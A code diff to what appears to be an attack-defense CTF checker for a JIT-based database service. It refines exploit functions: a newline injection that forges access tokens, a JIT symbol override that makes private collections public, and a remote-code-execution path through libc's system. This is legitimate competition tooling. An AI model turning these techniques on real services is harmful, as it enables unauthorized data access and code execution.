@@ -3,7 +3,7 @@ import os
 from contextlib import contextmanager
 from functools import wraps
 from logging import LoggerAdapter
-from typing import Callable, TypeVar, ParamSpec, Awaitable, Generator
+from typing import Callable, TypeVar, ParamSpec, Awaitable, Generator, Any
 
 from enochecker3 import (
     ChainDB,
@@ -58,6 +58,15 @@ def log_code_on_error(logger: LoggerAdapter, query: Function) -> Generator[None,
         print(query.as_script())
         logger.info(f"Here's what we submitted: {query.as_script()}")
         raise
+
+
+def dump_strings(a: Any) -> str:
+    """Pull a flag out of any JSON object. Unicode-safe."""
+    if isinstance(a, list):
+        return ', '.join(dump_strings(_) for _ in a)
+    if isinstance(a, dict):
+        return ', '.join(f'{dump_strings(k)}: {dump_strings(v)}' for k, v in a.items())
+    return str(a)
 
 
 @checker.putflag(1)
@@ -281,17 +290,24 @@ async def exploit_kv_newline_injection(task: ExploitCheckerTaskMessage, logger: 
     my_token = generate_token()
 
     # get keys
-    keys = (await client.api_get(username))[:10]
-    # hack first 5 keys
-    data = ''
+    try:
+        keys = (await client.api_get(username))[:10]
+    except MumbleException as e:
+        logger.warning(f'Account {username} does not exist or has no API', exc_info=e)
+        return None
+
+    # hack each key individually
+    logger.info(f'Attacking database {username} ({len(keys)} keys)')
+    all_output = ''
     for key in keys:
+        logger.info(f'write fake token {my_token} for key {key}...')
         # these newlines inject a faked "grant" structure into the database
         data = '{"fake_token":\n' + json.dumps({'key': key, 'token': my_token}) + '\n}'
         await client.post(f'/api/{username}/create', data=data, headers={'Content-Type': 'application/json'})
         response = await client.api_get(username, 'value', key, my_token)
-        logger.info(f'Key {key} => {response}')
-        data += json.dumps(response)
-    return searcher.search_flag(data)
+        logger.info(f'Key {key} with fake token {my_token} => {response}')
+        all_output += dump_strings(response) + ' '
+    return searcher.search_flag(all_output)
 
 
 @checker.exploit(0)
@@ -300,6 +316,7 @@ async def exploit_jit(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, se
     if not task.attack_info:
         raise InternalErrorException("Missing attack info")
     f1 = await exploit_jit_symbol_override(task.attack_info, logger, searcher, httpclient)
+    httpclient.cookies.clear()
     f2 = await exploit_jit_rce(task.attack_info, logger, searcher, httpclient)
     return f1 if f1 == f2 else None  # tests should succeed iff both exploits worked
 
@@ -313,17 +330,21 @@ async def exploit_jit_symbol_override(database: str, logger: LoggerAdapter, sear
                           'business')
 
     # get target collections
-    collections = await client.db_list_collections(database)
+    try:
+        collections = await client.db_list_collections(database)
+    except MumbleException as e:
+        logger.warning(f'Account {database} does not exist or is not public', exc_info=e)
+        return None
     collections = [c for c in collections if 'private' in c]
     # this "function" will override the DataStorage::isPublic symbol from libjit_rt
     code = 'func _ZN11DataStorage8isPublicEv(){ return true; }\n'
     for collection in collections:
         code += f'query hack_{collection} on {collection};'
-    data = ''
+    all_output = ''
     for collection in collections:
         _, result = await client.db_query(database, code, f'hack_{collection}', None)
-        data += json.dumps(result)
-    return searcher.search_flag(data)
+        all_output += dump_strings(result) + ' '
+    return searcher.search_flag(all_output)
 
 
 async def exploit_jit_rce(database: str, logger: LoggerAdapter, searcher: FlagSearcher, httpclient: AsyncClient) -> bytes | None:
@@ -333,6 +354,12 @@ async def exploit_jit_rce(database: str, logger: LoggerAdapter, searcher: FlagSe
     await client.register(generate_username(), generate_password(),
                           generate_random_string(8, False), generate_random_string(8, False),
                           'business')
+
+    try:
+        await client.db_list_collections(database)
+    except MumbleException as e:
+        logger.warning(f'Account {database} does not exist or is not public', exc_info=e)
+        return None
 
     # jit_rt_equal leaves string pointers in $rdi if both sides are the same length (alternative: jit_rt_lt).
     # system links to libc's system
@@ -345,9 +372,12 @@ async def exploit_jit_rce(database: str, logger: LoggerAdapter, searcher: FlagSe
     }
     '''.strip()
     output, result = await client.db_query(database, code, 'hack', None)
-    return searcher.search_flag(json.dumps(output) + json.dumps(result))
+    all_output = dump_strings(output) + ' ' + dump_strings(result)
+    return searcher.search_flag(all_output)
 
 
 if __name__ == "__main__":
     # production: gunicorn -c gunicorn.conf.py "checker:app()"
+    import logging
+    logging.basicConfig(format=f'[%(asctime)s.%(msecs)03d] %(levelname)-9.9s: %(message)s', level=logging.INFO)
     checker.run(port=8001)
